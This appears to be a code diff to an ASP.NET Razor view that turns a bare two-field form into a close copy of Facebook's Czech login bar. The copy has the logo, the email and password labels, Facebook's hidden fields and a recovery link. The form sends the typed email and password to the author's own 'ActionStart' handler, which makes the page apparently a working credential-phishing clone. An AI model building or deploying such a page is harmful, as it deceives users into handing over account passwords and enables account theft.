@@ -7,14 +7,71 @@
     
 </head>
 
-<body>
+<body class="fbIndex UIPage_LoggedOut ie10 win Locale_cs_CZ">
+    <div class="_li">
+        <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
+            <div id="blueBarHolder"><div id="blueBar">
+                <div>
+                    <div class="loggedout_menubar_container">
+                        <div class="clearfix loggedout_menubar">
+                            <a class="lfloat" href="/" title="P&#x159;ej&#xed;t na hlavn&#xed; str&#xe1;nku Facebooku">
+                            <i class="fb_logo img sp_e2gpgs sx_584554"><u>Logo Facebook</u></i></a>
+                            <div class="menu_login_container rfloat">
+                            @using (Html.BeginForm("ActionStart", "Home", FormMethod.Post))
+                            {
+                                <input type="hidden" name="lsd" value="AVqgSK3P" autocomplete="off" />
+                                <table cellspacing="0">
+                                <tr>
+                                    <td class="html7magic"><label for="email">E-mail nebo telefon</label></td>
+                                    <td class="html7magic"><label for="pass">Heslo</label></td>
+                                </tr>
+                                <tr>
+                                    <td> @Html.TextBoxFor(model => model.leto, new { @class="inputtext", @name="email", @id="email", @value="", @tabindex="1" })</td>
+                                    <td>@Html.PasswordFor(model => model.zima, new { @class="inputtext", @name="pass", @id="pass", @tabindex="2"})</td>
+                                    <td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_b"><input value="P&#x159;ihl&#xe1;sit se" tabindex="4" type="submit" id="u_0_b" /></label></td>
+                                    </tr>
+                                <tr>
+                                <td class="login_form_label_field">
+                                    <div>
+                                        <div class="uiInputLabel clearfix">
+                                            <input id="persist_box" type="checkbox" name="persistent" value="0" checked="0" class="uiInputLabelCheckbox" />
+                                            <label for="persist_box">Zůstat přihlášen(a)</label>
+                                        </div>
+                                        <input type="hidden" name="default_persistent" value="1" />
+                                    </div>
+                                 </td>
+                                 <td class="login_form_label_field">
+                                    <a rel="nofollow" href="http://www.facebook.com/recover/initiate">Zapomněli jste své heslo?</a>
+                                 </td>
+                                 </tr>
+                                 </table>
+                                <input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_a" />
+                                <input type="hidden" name="lgnrnd" value="080109_ot55" />
+                                <input type="hidden" id="lgnjs" name="lgnjs" value="n" />
+                                <input type="hidden" autocomplete="off" id="locale" name="locale" value="cs_CZ" />
+                            }
+                            </div>
+                        </div>
+                    </div>
+                    <div id="login_chooser_container" class="_4--d hidden_elem">
+                        <div class="_4--f">
+                            <div class="_4--e" id="u_0_c">RECENT LOGINS</div>
+                            <div id="u_0_d">
+                                <div id="user_chooser_user_container" class="_4--g hidden_elem"><div class="userBox">
+                                    <div class="_4--i"><img class="_s0 _4--h _rv img" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y4/r/-PAXP-deijE.gif" alt="" /></div>
+                                    <div class="_507d"></div>
+                                </div>
+                                <div class="_27-r"><label class="closeButton"></label></div>
+                            </div>
+                       </div>
+                  </div>
+             </div>
+        </div>
+    </div>
+    </div>
+</div>
 
 
-@using (Html.BeginForm("ActionStart", "Home", FormMethod.Post))
-{
-    @Html.TextBoxFor(model => model.leto)
-    @Html.TextBoxFor(model => model.zima)
-}
 
 </body>
     
